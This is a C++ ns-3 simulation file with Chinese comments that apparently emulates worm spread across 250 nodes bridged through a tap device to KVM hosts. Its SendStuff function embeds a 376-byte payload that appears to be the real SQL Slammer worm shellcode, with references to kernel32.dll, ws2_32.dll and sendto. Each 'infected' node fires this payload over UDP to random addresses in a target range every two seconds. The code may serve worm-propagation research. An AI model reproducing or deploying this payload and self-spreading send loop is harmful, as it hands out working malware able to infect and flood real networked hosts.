#include "ns3/abort.h"
#include "ns3/core-module.h"
#include "ns3/internet-module.h"
#include "ns3/network-module.h"
#include "ns3/fd-net-device-module.h"
#include "ns3/applications-module.h"
#include "ns3/ipv4-static-routing-helper.h"
#include "ns3/ipv4-list-routing-helper.h"
#include "ns3/csma-module.h"
#include "ns3/config-store-module.h"
#include "ns3/ipv4-global-routing-helper.h"
#include "ns3/realtime-simulator-impl.h"
#include "ns3/synchronizer.h"
#include "ns3/enum.h"
#include "ns3/tap-bridge-module.h"
#include "ns3/simulator.h"
#include "ns3/double.h"
#include "ns3/integer.h"
#include "ns3/nstime.h"
#include "ns3/command-line.h"
#include "ns3/rng-seed-manager.h"
#include "ns3/random-variable-stream.h"
#include <netdb.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include<unistd.h>
#include <fstream>
#include <iostream>
#include <vector>
#include <string>
#include <sstream>


//#define _UDPCLI_DEBUG_

using namespace ns3;

NS_LOG_COMPONENT_DEFINE ("SocketOptionsIpv4");

/*
* 设置感染位
*/
int infected[250]={0};  //将感染位全设为0，未感染。
int infectedCounts=0;   //感染主机个数

Ptr<UniformRandomVariable> uv;
unsigned int start_ip;
unsigned int end_ip;
unsigned int range;
unsigned int mac_id;
std::string localip;
/*
* 设置全局参数
*/
std::string scan_ip_from="171.0.0.5";  //另外一组节点的IP起始地址
std::string scan_ip_to="171.0.0.254";  //另外一组节点的IP结束地址
uint16_t scan_port=5000;
float scan_interval=2.0; //发包间隔时间
std::string local_network="173.0.0.0";//表明当前节点的网络地址
int node_number = 250;//模拟节点个数
std::string KVM_gateway_address="173.0.0.1";



/*
*下面是自定义函数
*/

std::string 
int2str(const int &int_temp);

unsigned int 
IpToInt(std::string s);

void 
SendStuff (Ptr<Socket> sock, Ipv4Address dstaddr, uint16_t port);

void
srcSocketRecv (Ptr<Socket> socket);

static std::string
GetIp();

/*
* main 开始
*/
int main(int argc, char *argv[])
{	
  //利用实时的模拟器
  GlobalValue::Bind ("SimulatorImplementationType", StringValue ("ns3::RealtimeSimulatorImpl"));
  //启用计算校验和
  GlobalValue::Bind ("ChecksumEnabled", BooleanValue (true));
  //tap使用的模式
  std::string mode = "UseBridge";
  //tap的名字
  std::string tapName = "mytap";
  //命令行解析
  CommandLine cmd;
  cmd.AddValue ("scan_ip_from", "scan_ip_from", scan_ip_from);
  cmd.AddValue ("scan_ip_to", "scan_ip_to", scan_ip_to);
  cmd.AddValue ("scan_port", "scan_port", scan_port);
  cmd.AddValue ("scan_interval", "scan_interval", scan_interval);
  cmd.AddValue ("local_network", "local_network", local_network);
  cmd.AddValue ("node_number", "node_number", node_number);
  cmd.AddValue ("KVM_gateway_address", "KVM_gateway_address", KVM_gateway_address);
  cmd.Parse (argc, argv);
 

  //节点个数增加1，是因为有一个节点为tap,不能参与感染，
  node_number = node_number + 1 ;
 
  //解析输入的字符串类型的ip地址
  start_ip = IpToInt(scan_ip_from);
  end_ip = IpToInt(scan_ip_to);
  range = end_ip-start_ip;
  mac_id = IpToInt(local_network);
  //for循环的下标
  int i=0;

srand((unsigned)time(0));
int hdl_seed=rand()%200000;


  //设置种子为1
  RngSeedManager::SetSeed(hdl_seed);   // 设置运行标识：RngSeedManager::SetRun(4); 
  uv = CreateObject<UniformRandomVariable>();
  uv->SetAttribute("Min",DoubleValue(0.0));
  uv->SetAttribute("Max",DoubleValue(range));
 
  //创建2个计算机节点
  NodeContainer csmaNodes;
  csmaNodes.Create (node_number);
  
  //安装csma信道类型的网卡
  CsmaHelper csma;
  NetDeviceContainer csmaDevices;
  csmaDevices = csma.Install (csmaNodes,mac_id);
  
  //安装Internet协议栈
  InternetStackHelper stack;
  stack.SetIpv4StackInstall(true);
  stack.Install (csmaNodes);
  
  //给网卡分配IP地址
  Ipv4AddressHelper addresses;
  addresses.SetBase (local_network.c_str(), "255.255.255.0","0.0.0.4");
  Ipv4InterfaceContainer csmaInterfaces = addresses.Assign (csmaDevices);
  
  //给tap设置属性
  TapBridgeHelper tapBridge;
  tapBridge.SetAttribute ("Mode",StringValue (mode));
  tapBridge.SetAttribute ("DeviceName",StringValue (tapName));
  
  //给计算机节点0、计算机节点0的网卡安装tap,
  tapBridge.Install (csmaNodes.Get (0), csmaDevices.Get (0));
  
  
  
  //设置路由需要用到哪些东西？？  所谓的聚合对象到底是啥？？要不要搞清楚。
  uint32_t interfacep[node_number];
  Ptr<Ipv4> ipv4csma[node_number];
  for(i=0;i<node_number;i++){
	  
	  //Node节点中得到Ipv4
      ipv4csma[i]=csmaNodes.Get(i)->GetObject<Ipv4>(); //Node节点中得到Ipv4
      // Ipv4InterfaceContainer中Get(i)返回std::pair< Ptr< Ipv4 >, uint32_t >
      interfacep[i]=csmaInterfaces.Get(i).second;//这个什么意思 我昨天说网卡有两个东西 一个是地址 一个是索引 second就是那个索引
	  //设置跳数
      ipv4csma[i]->SetMetric(interfacep[i], 1);
	  //启动
      ipv4csma[i]->SetUp(interfacep[i]);
  }
  
 //设置node的路由，指向对应kvm路由器的地址
  Ipv4Address gateway (KVM_gateway_address.c_str());

  Ipv4StaticRoutingHelper ipv4RoutingHelper;
  Ptr<Ipv4StaticRouting> staticRouting[node_number];
  
  //设置其他ns3虚拟节点的路由，网关指向node对应的ip
  for(i=0;i<node_number;i++){
      staticRouting[i] = ipv4RoutingHelper.GetStaticRouting (ipv4csma[i]);
      staticRouting[i]->SetDefaultRoute (gateway, interfacep[i]);
  }
   
   
   //设置socket接收函数
   Ptr<Socket> server[node_number];
   for (i=0;i<node_number;i++)
  {
   server[i] = Socket::CreateSocket(csmaNodes.Get(i),TypeId::LookupByName("ns3::UdpSocketFactory"));//创建socket
   server[i] -> Bind(InetSocketAddress(Ipv4Address::GetAny(), scan_port));   //绑定IP地址，设置接收端口是5000
   server[i] -> SetRecvCallback(MakeCallback(&srcSocketRecv));           //设置回调的接收函数
  }
  
  localip = GetIp();
  Ipv4GlobalRoutingHelper::PopulateRoutingTables ();
  Simulator::Stop (Seconds (100000));
  Simulator::Run ();
  Simulator::Destroy ();
}// end main()


//将int转化成string
std::string int2str(const int &int_temp)
{
	    std::string string_temp;
        std::stringstream stream;
        stream<<int_temp;
        stream>>string_temp;   
        return string_temp;
}


//将字符串类型ip转化位u_int
unsigned int IpToInt(std::string s)
{
	unsigned int ret=0;
	unsigned int num=0;
	for(uint32_t i=0;i<s.size();i++)
	{
		if(s[i]!='.')
		{
			num=num*10+(s[i]-'0');
			
		}
		else
		{
			ret=ret<<8;
			ret+=num;
			num=0;
		}
	}
	ret=ret<<8;
	ret+=num;
	return ret;	
}

static std::string GetIp()
{ struct ifaddrs * ifAddrStruct=NULL;
  void * tmpAddrPtr=NULL;
  getifaddrs(&ifAddrStruct);
  while(ifAddrStruct!=NULL){
        if(ifAddrStruct->ifa_addr->sa_family==AF_INET){
                tmpAddrPtr=&((struct sockaddr_in *)ifAddrStruct->ifa_addr)->sin_addr;
                char addressBuffer[INET_ADDRSTRLEN];
                inet_ntop(AF_INET,tmpAddrPtr,addressBuffer,INET_ADDRSTRLEN);
                std::string ifname;
		ifname = ifAddrStruct->ifa_name;
		if(ifname=="pnet0"){
			localip = addressBuffer;
		}
        }
        ifAddrStruct=ifAddrStruct->ifa_next;
  }
  return localip;
}
//.......本代码使用的发包函数..............
void SendStuff (Ptr<Socket> sock, Ipv4Address dstaddr, uint16_t port)
{
  uint8_t fill1[376]={4, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 220, 201, 176, 66, 235, 14, 1, 1, 1, 1, 1, 1, 1, 112, 174, 66, 1, 112, 174, 66, 144, 144, 144, 144, 144, 144, 144, 144, 104, 220, 201, 176, 66, 184, 1, 1, 1, 1, 49, 201, 177, 24, 80, 226, 253, 53, 1, 1, 1, 5, 80, 137, 229, 81, 104, 46, 100, 108, 108, 104, 101, 108, 51, 50, 104, 107, 101, 114, 110, 81, 104, 111, 117, 110, 116, 104, 105, 99, 107, 67, 104, 71, 101, 116, 84, 102, 185, 108, 108, 81, 104, 51, 50, 46, 100, 104, 119, 115, 50, 95, 102, 185, 101, 116, 81, 104, 115, 111, 99, 107, 102, 185, 116, 111, 81, 104, 115, 101, 110, 100, 190, 24, 16, 174, 66, 141, 69, 212, 80, 255, 22, 80, 141, 69, 224, 80, 141, 69, 240, 80, 255, 22, 80, 190, 16, 16, 174, 66, 139, 30, 139, 3, 61, 85, 139, 236, 81, 116, 5, 190, 28, 16, 174, 66, 255, 22, 255, 208, 49, 201, 81, 81, 80, 129, 241, 3, 1, 4, 155, 129, 241, 1, 1, 1, 1, 81, 141, 69, 204, 80, 139, 69, 192, 80, 255, 22, 106, 17, 106, 2, 106, 2, 255, 208, 80, 141, 69, 196, 80, 139, 69, 192, 80, 255, 22, 137, 198, 9, 219, 129, 243, 60, 97, 217, 255, 139, 69, 180, 141, 12, 64, 141, 20, 136, 193, 226, 4, 1, 194, 193, 226, 8, 41, 194, 141, 4, 144, 1, 216, 137, 69, 180, 106, 16, 141, 69, 176, 80, 49, 201, 81, 102, 129, 241, 120, 1, 81, 141, 69, 3, 80, 139, 69, 172, 80, 255, 214, 235, 202};;
  Ptr<Packet> p = Create<Packet> (fill1, 376);
  sock->SendTo (p, 0, InetSocketAddress (dstaddr,port));
  
  #ifdef _UDPCLI_DEBUG_
  std::cout<<"socket id = "<<sock->GetNode()->GetId()<<std::endl;
  #endif
  
  unsigned int dest_IP;
  dest_IP = start_ip +  uv->GetInteger();
  Simulator::Schedule (Seconds(scan_interval), &SendStuff, sock, Ipv4Address(dest_IP), port);
 
  return;
}// end SendStuff()..............
  

//......本代码使用的接收函数.......................
void
srcSocketRecv (Ptr<Socket> socket)
{
	
  //得到发送方的地址：
  Address from;
  Ptr<Packet> packet = socket->RecvFrom (from);
  packet->RemoveAllPacketTags ();
  packet->RemoveAllByteTags ();
  InetSocketAddress address = InetSocketAddress::ConvertFrom (from);
  #ifdef _UDPCLI_DEBUG
 
  std::cout<<"发送方的ip和端口："<<InetSocketAddress::ConvertFrom(from).GetIpv4()
                                 <<":"
								 <<InetSocketAddress::ConvertFrom(from).GetPort()<<std::endl;
  #endif
  NS_LOG_INFO ("Destination Received " << packet->GetSize () << " bytes from " << address.GetIpv4 ());
  NS_LOG_INFO ("Triggering packet back to source node's interface 1");
  
  //得到接收方地址
  Ptr<Node> node = socket->GetNode ();
  Ptr<Ipv4> ipv4 = node->GetObject<Ipv4>();
  Ipv4InterfaceAddress iaddr = ipv4->GetAddress(1,0);
  Ipv4Address ipaddr = iaddr.GetLocal();
  
  std::string ipBase=local_network.substr(0, local_network.length()-1);
  for(int i=0;i<250;i++){
	  std::string temp=ipBase+int2str(i+5);
	  /*ipaddr==Ipv4Address(temp.c_str())判断现在的当前的ip地址是属于哪一个节点,
	  *判断该节点是否感染，如果没有，则设置感染位为1,且让该节点不断发包。
	  *如果被感染，那么什么事都不做。
	  */
	  if((ipaddr==Ipv4Address(temp.c_str()))&&(infected[i]==0)){
		  infected[i]=1;
		  
		  infectedCounts++;
		  std::cout << localip << " " << Simulator::Now().GetSeconds() << " " << address.GetIpv4() << " " << ipaddr << std::endl;
		  //std::cout<<Simulator::Now().GetSeconds()<<"s: "<<infectedCounts<<"/"<< 250 <<" "<<ipaddr<<" is infected"<<std::endl;
		  
		  unsigned int dest_IP;
		  dest_IP = start_ip +  uv->GetInteger();
		  
		  Simulator::Schedule (Seconds(scan_interval), &SendStuff, socket, Ipv4Address(dest_IP), scan_port);  
	  }
  }
  
  #ifdef _UDPCLI_DEBUG_
  std::cout<<"接收方的ip和端口："<<ipaddr
                                 <<":"
                                 <<"5000,I guess!"<<std::endl;
  #endif
}//end srcSocketRecv()........................................

